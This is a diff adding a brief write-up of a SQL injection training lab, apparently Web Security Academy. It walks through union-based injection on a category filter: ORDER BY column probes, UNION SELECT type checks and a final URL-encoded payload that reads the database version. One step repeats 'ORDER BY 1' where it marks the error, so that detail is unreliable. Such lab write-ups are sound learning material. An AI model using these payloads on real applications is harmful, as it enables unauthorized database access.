@@ -1,0 +1,36 @@
+[+] Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
+
+[+] Vulnerability
+Union SQL Injection
+
+[+] Location
+Product category filter
+
+[+] Goal
+display the database version string.
+
+[+] Analysis
+url - https://0a4400ae0328155082feb6ba00c200f0.web-security-academy.net/filter?category=Gifts
+
+https://0a4400ae0328155082feb6ba00c200f0.web-security-academy.net/filter?category='
+
+[+] Determining the numbers of columns
+' ORDER BY 1#
+'+ORDER+BY+1%23
+'+ORDER+BY+2%23
+'+ORDER+BY+1%23 - Error
+
+Total number of 2 columns
+
+[+] Determing valid datatype
+' UNION SELECT NULL,NULL#
+
+' UNION SELECT 'ctfsec','r007'#
+
+[+] Extraction database version
+SELECT @@version 
+
+' UNION SELECT @@version,NULL#
+
+[+] Final Payload
+'+UNION+SELECT+%40%40version,NULL%23
